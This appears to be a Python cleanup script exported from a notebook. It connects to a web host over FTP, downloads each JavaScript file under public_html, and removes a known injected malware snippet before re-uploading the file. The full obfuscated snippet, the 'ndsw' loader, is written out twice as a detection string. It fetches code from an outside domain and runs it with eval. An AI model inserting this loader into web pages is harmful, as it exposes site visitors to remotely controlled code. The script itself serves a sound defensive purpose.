# -*- coding: utf-8 -*-
"""malcious.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1GzBlkAIczwEQMSEDjf68rDgli5tRPsMs
"""

import ftplib
import urllib
 

 
from urllib.request import urlopen,Request
import io
import json
import re

server = ftplib.FTP_TLS()
server.connect('host')
server.login('user',"password")
files = ftplib.FTP_TLS.nlst(self=server)
dot=[]
dir=[]
digit_file=[]
files = ftplib.FTP_TLS.nlst(self=server)
 
    
def parse_directory(server,path):
    all_files=[]
    dot_file=[]
    dir=[]
    file=[]
    digit_file=[]
    listf=""
    try:
       server.cwd(path)
       listf=server.nlst()
    except:
       pass   
    parent_dir=ftplib.FTP_TLS.pwd(self=server)
    # print(parent_dir) 
    ur="http://sitename.com"+parent_dir
    # print(ur)
    for i in listf:
      if i.find('.') != -1:
         if i=='.':
            continue
         if i=='..':
            continue
         if i.find(".js") != -1:
            
            url=ur+'/'+i
        #   print(url)
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'}) 
            try:   
               u =   urlopen(req)
               contents=u.read()
              #  malcious_code="if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};".encode()
               malcious_code="if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};".encode()
              
                
                  
               if malcious_code in contents:
                  dat=malcious_code.decode()
              #   print(type(dat))
               #  x = contents.replace(, "")
                  data=contents.decode().replace(dat, " ")
              #   
                  data = io.BytesIO(data.encode('utf-8'))
                  x=url.split('/')
                
                  last_element = x[-1]
                  del x[:3]
                  del x[-1]
                  listToStr = '/'.join([str(elem) for elem in x])

               
                  parent=ftplib.FTP_TLS.pwd(self=server) 
                  print(parent) 
                  listToStr="/"+listToStr
                
                
                  if parent ==listToStr:
                    print("found")
                    server.storlines("STOR %s" %last_element,data)
                    print("uploaded ")
                  else:
                    server.cwd(listToStr)  
                    server.storlines("STOR %s" %last_element,data)
                    print("uploaded later")
                  #  server.cwd(listToStr)
                  #  server.storlines("STOR %s" %last_element,data)
                  #  if server.storlines("STOR %s" %last_element,data):
                  #     print("uploaded successfully")
                  #  else:
                  #     print("Not uploaded yet")   
                  #  print("Wrong directory") 
                   
               else:
                 print("Not found")
                #  pass
             
            except:
                 pass 
         else:
             pass           
      else:
        path=parent_dir+'/'+i
        parse_directory(server,parent_dir+'/'+i)
        print(path)
    # pass

print(parse_directory(server,"/public_html"))